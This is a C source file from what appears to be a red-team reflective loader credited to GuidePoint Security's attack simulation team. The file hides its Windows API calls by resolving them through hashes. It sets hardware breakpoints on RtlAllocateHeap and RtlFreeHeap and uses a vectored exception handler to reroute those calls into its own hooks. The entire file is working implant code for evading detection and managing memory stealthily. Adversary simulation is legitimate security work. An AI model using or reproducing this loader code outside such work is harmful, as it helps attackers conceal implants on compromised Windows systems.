/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef struct
{
	D_API( NtSetContextThread );
	D_API( NtGetContextThread );
	D_API( LdrLoadDll );
} API ;

/* API Hashes */
#define H_API_NTSETCONTEXTTHREAD	0xffa0bf10 /* NtSetContextThread */
#define H_API_NTGETCONTEXTTHREAD	0x6d22f884 /* NtGetContextThread */

/* STR Hashes */
#define H_STR_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_STR_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Enables the heap breakpoints
 *
!*/
static D_SEC( D ) VOID EnableHeapHook( VOID )
{
	API	Api;
	CONTEXT	Ctx;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

	Api.NtSetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
	Api.NtGetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );

	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	if ( NT_SUCCESS( Api.NtGetContextThread( NtCurrentThread(), &Ctx ) ) ) {
		/* Set DR2 to RtlAllocateHeap */
		Ctx.Dr2 = U_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_RTLALLOCATEHEAP ) );

		/* Set DR3 to RtlFreeHeap */
		Ctx.Dr3 = U_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_RTLFREEHEAP ) );

		/* Enable breakpoints */
		Ctx.Dr7 &= ~( 3ULL << ( 16 + 4 * 2 ) );
		Ctx.Dr7 &= ~( 3ULL << ( 16 + 4 * 3 ) );
		Ctx.Dr7 |= 1ULL << ( 2 * 2 );
		Ctx.Dr7 |= 1ULL << ( 2 * 3 );

		Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

		if ( NT_SUCCESS( Api.NtSetContextThread( NtCurrentThread(), &Ctx ) ) ) {
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
};

/*!
 *
 * Purpose:
 *
 * Removes the heap breakpoints
 *
!*/
static D_SEC( D ) VOID RemoveHeapHook( VOID )
{
	API	Api;
	CONTEXT	Ctx;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

	Api.NtSetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
	Api.NtGetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );

	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	if ( NT_SUCCESS( Api.NtGetContextThread( NtCurrentThread(), &Ctx ) ) ) {
		/* Clear hooks */
		Ctx.Dr2 = 0;
		Ctx.Dr3 = 0;

		/* Remove breaks */
		Ctx.Dr7 &= ~( 1ULL << ( 2 * 2 ) );
		Ctx.Dr7 &= ~( 1ULL << ( 2 * 3 ) );

		Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

		if ( NT_SUCCESS( Api.NtSetContextThread( NtCurrentThread(), &Ctx ) ) ) {
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
};

/*!
 *
 * Purpose:
 *
 * Hooks RtlAllocateHeap via a VEH debugger, and
 * forces it to be tracked by the heap memory
 * tracker.
 *
!*/
static D_SEC( D ) PVOID WINAPI RtlAllocateHeapHook( _In_ HANDLE ProcessHeap, _In_ ULONG Flags, _In_ SIZE_T Length )
{
	PVOID	Ptr = NULL;

	/* Remove heap breakpoints */
	RemoveHeapHook( );

	/* Execute the call */
	Ptr = HeapAlloc_Hook( ProcessHeap, Flags, Length );

	/* Enable heap breakpoints */
	EnableHeapHook( );

	/* Return */
	return Ptr;
};

/*!
 *
 * Purpose:
 *
 * Hooks RtlFreeHeap via a VEH debugger, and
 * forces it to be freed by the heap memory
 * tracker.
 *
!*/
static D_SEC( D ) BOOL WINAPI RtlFreeHeapHook( _In_ HANDLE ProcessHeap, _In_ ULONG Flags, _In_ PVOID lpMem )
{
	BOOL	Ret = FALSE;

	/* Remove heap breakpoitns */
	RemoveHeapHook( );

	/* Execute the call */
	Ret = HeapFree_Hook( ProcessHeap, Flags, lpMem );

	/* Enable heap breakpoints */
	EnableHeapHook( );

	/* Return */
	return Ret;
};

/*!
 *
 * Purpose:
 *
 * VEH debugger that forces calls to RtlAllocateHeap,
 * and RtlFreeHeap to be redirected to hooks that 
 * will track the allocation and free it.
 *
!*/
static D_SEC( D ) LONG WINAPI VehDebugger( _In_ PEXCEPTION_POINTERS ExceptionIf )
{
	LONG	Ret = EXCEPTION_CONTINUE_SEARCH;
	PTABLE	Tbl = NULL;

	/* Get a pointer to the table */
	Tbl = C_PTR( G_SYM( Table ) );

	/* Is this our thread we are targeting? */
	if ( U_PTR( Tbl->Table->ClientId.UniqueThread ) == U_PTR( NtCurrentTeb()->ClientId.UniqueThread ) ) {
		if ( ExceptionIf->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ) {
			if ( U_PTR( ExceptionIf->ExceptionRecord->ExceptionAddress ) == U_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_RTLALLOCATEHEAP ) ) ) {
				/* Inject Hook */
				#if defined( _WIN64 )
				ExceptionIf->ContextRecord->Rip = U_PTR( G_SYM( RtlAllocateHeapHook ) );
				#else
				ExceptionIf->ContextRecord->Eip = U_PTR( G_SYM( RtlAllocateHeapHook ) );
				#endif
			};
			if ( U_PTR( ExceptionIf->ExceptionRecord->ExceptionAddress ) == U_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_RTLFREEHEAP ) ) ) {
				/* Inject Hook */
				#if defined( _WIN64 )
				ExceptionIf->ContextRecord->Rip = U_PTR( G_SYM( RtlFreeHeapHook ) );
				#else
				ExceptionIf->ContextRecord->Eip = U_PTR( G_SYM( RtlFreeHeapHook ) );
				#endif
			};
			Ret = EXCEPTION_CONTINUE_SEARCH;
		};
	};
	return Ret;
};
